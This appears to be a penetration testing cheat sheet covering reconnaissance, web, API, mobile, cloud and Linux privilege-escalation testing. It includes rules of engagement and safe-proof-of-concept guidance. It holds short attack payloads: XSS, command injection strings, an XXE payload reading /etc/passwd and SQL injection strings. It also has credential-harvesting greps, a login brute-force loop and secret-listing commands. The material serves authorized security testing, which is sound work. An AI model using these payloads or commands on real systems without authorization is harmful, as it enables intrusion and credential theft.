# Penetration Testing

## Reconnaissance

### Passive Information Gathering

```bash
# DNS enumeration
dig example.com ANY
nslookup -type=any example.com

# Subdomain discovery
subfinder -d example.com
amass enum -d example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%.example.com&output=json"
```

### Active Scanning

```bash
# Port scanning
nmap -sV -p- target.com
nmap -sC -sV -oA scan target.com

# Web technology detection
whatweb target.com
```

## Web Application Testing

### Authentication & Authorization

```bash
# Session analysis - Check for:
# - Session timeout, Secure/HttpOnly flags
# - Session fixation, concurrent sessions

# IDOR testing
GET /api/users/123  # Your ID
GET /api/users/124  # Another user - should fail

# Privilege escalation
GET /api/admin/users  # As standard user
```

### Input Validation

```bash
# SQL injection
sqlmap -u "http://target.com/search?q=test" --batch

# XSS payloads
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Command injection
; ls -la
| whoami
$(whoami)

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## API Security Testing

### JWT & Token Security

```bash
# Decode JWT
echo "eyJ..." | base64 -d

# Test none algorithm
# Modify header: {"alg": "none"}

# Weak secret brute force
hashcat -m 16500 jwt.txt wordlist.txt
```

### Rate Limiting & Data Exposure

```bash
# Test rate limits
for i in {1..1000}; do
  curl https://api.target.com/login -d "user=test&pass=test"
done

# Check for excessive data exposure
GET /api/users/me
# Look for: password hashes, internal IDs, sensitive PII

# Mass assignment
POST /api/users/profile
{"email": "new@email.com", "isAdmin": true}
```

## Network Penetration

### Privilege Escalation (Linux)

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Writable paths in PATH
echo $PATH | tr ':' '\n' | xargs -I {} ls -ld {}

# Kernel exploits
uname -a
searchsploit linux kernel $(uname -r)
```

### Lateral Movement

```bash
# Network enumeration
arp -a
netstat -ant

# Service discovery
nmap -sV 192.168.1.0/24

# Credential harvesting
grep -r "password" /home/*/
cat ~/.bash_history | grep -i "pass\|pwd\|secret"
```

## Mobile Application Testing

### Android

```bash
# Decompile APK
apktool d app.apk
jadx -d output app.apk

# Check for secrets
grep -r "api_key\|secret\|password" .

# Insecure storage
adb shell
run-as com.app.package
find . -type f -exec cat {} \;
```

### iOS

```bash
# Class dump
class-dump App.app

# Check data storage
sqlite3 /var/mobile/Applications/.../Library/Caches/data.db
```

## Cloud Security Testing

### AWS

```bash
# S3 bucket enumeration
aws s3 ls s3://bucket-name --no-sign-request
aws s3api get-bucket-acl --bucket bucket-name

# IAM enumeration
aws iam get-user
aws iam list-attached-user-policies --user-name username
```

### Container & Kubernetes

```bash
# Docker escape testing
docker inspect container_id | grep -i privileged
docker inspect container_id | grep -A 5 Mounts

# Kubernetes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl auth can-i --list
```

## Exploitation Validation

### Proof of Concept Guidelines

```python
# Always demonstrate impact SAFELY

# SQL injection PoC
# DON'T: Extract actual data
# DO: Prove injection with sleep
payload = "' OR SLEEP(5)--"

# DON'T: Delete/modify production data
# DO: Show you COULD with SELECT
payload = "' UNION SELECT 'proof_of_concept'--"
```

### Rules of Engagement

1. **Scope verification** - Only test authorized targets
2. **Time windows** - Respect testing hours
3. **DoS prevention** - Avoid resource exhaustion
4. **Data handling** - Don't exfiltrate real data
5. **Stop on discovery** - Don't exploit beyond proof
6. **Immediate reporting** - Report critical findings ASAP
7. **Documentation** - Record all actions
8. **Cleanup** - Remove test artifacts

## Vulnerability Classification

### Severity Scoring

| Severity | Exploitability | Impact | CVSS Range |
|----------|---------------|---------|------------|
| Critical | Easy | Full compromise | 9.0-10.0 |
| High | Medium | Significant access | 7.0-8.9 |
| Medium | Hard | Limited access | 4.0-6.9 |
| Low | Very hard | Minimal impact | 0.1-3.9 |

### Impact Assessment

- **Critical**: Remote code execution, full data access, admin takeover
- **High**: Authentication bypass, privilege escalation, sensitive data exposure
- **Medium**: CSRF, XSS (non-admin), information disclosure
- **Low**: Missing security headers, verbose errors, rate limiting issues

## Testing Checklist

### OWASP Top 10 Coverage

- [ ] Broken Access Control (IDOR, path traversal)
- [ ] Cryptographic Failures (weak encryption, plaintext)
- [ ] Injection (SQL, XSS, command)
- [ ] Insecure Design (missing auth flows)
- [ ] Security Misconfiguration (defaults, debug mode)
- [ ] Vulnerable Components (outdated dependencies)
- [ ] Authentication Failures (weak passwords, session issues)
- [ ] Data Integrity (deserialization, lack of verification)
- [ ] Logging Failures (missing logs, exposed sensitive data)
- [ ] SSRF (unvalidated URLs)

## Quick Reference

| Test Type | Tools | Focus |
|-----------|-------|-------|
| Web App | Burp Suite, OWASP ZAP | OWASP Top 10 |
| API | Postman, curl | AuthN/AuthZ, data exposure |
| Network | nmap, Metasploit | Services, exploits |
| Mobile | MobSF, Frida | Data storage, crypto |
| Cloud | ScoutSuite, Prowler | Misconfigurations |

| Finding Type | Validation Method | Evidence Required |
|--------------|------------------|-------------------|
| SQL Injection | Sleep-based, error-based | Request/response, timing |
| XSS | Alert box, DOM manipulation | Screenshot, payload |
| IDOR | Access other user's resource | Two user accounts, IDs |
| Auth Bypass | Unauthorized access | Before/after screenshots |
| RCE | Command output (safe) | Whoami, id command output |
